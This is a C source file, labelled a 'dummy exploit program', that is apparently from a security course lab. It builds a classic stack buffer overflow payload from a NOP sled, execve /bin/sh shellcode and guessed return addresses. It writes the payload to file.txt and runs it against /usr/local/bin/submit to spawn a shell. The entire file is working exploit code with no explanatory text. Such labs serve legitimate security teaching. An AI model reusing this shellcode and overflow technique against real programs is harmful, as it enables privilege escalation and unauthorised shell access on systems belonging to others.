/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define TARGET "/usr/local/bin/submit"
#define NOP 0x90
#define OFFSET 310
#define BUFFER 512

unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

static char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main(void)
{

  char *args[4];
  char *env[1];

	//buffer for my exploit
	char exploit[BUFFER+100];

  FILE *file;
	long ra = get_sp() + OFFSET;
	int i = 0;
	int j = 0;

	//printf("0x%x\n", ra);

	//fill the buffer with predicted address
	for (i = 0; i < (BUFFER + 100); i+=4){
		*((long*)(&(exploit[i]))) = ra;
	}

	//fill the first half with NOP
	for (i = 0; i < BUFFER/2; i++){
		exploit[i] = NOP;
	}

	//fill the middle with shellcode
	for (i = BUFFER/2; i < BUFFER/2 + strlen(shellcode); i++){
		exploit[i] = shellcode[j];
		j++;
	}

  file = fopen("file.txt", "w");

  if (file == NULL) {
    fprintf(stderr, "Failed to create input file file.txt");
    return -1;
  }


	fputs(exploit,file);
	fclose(file);
  
  args[0] = TARGET; args[1] = "file.txt"; 
  args[2] = "message"; args[3] = NULL;

  env[0] = NULL;

  if (execve(TARGET, args, env) < 0)
    fprintf(stderr, "execve failed.\n");

  exit(0);
}

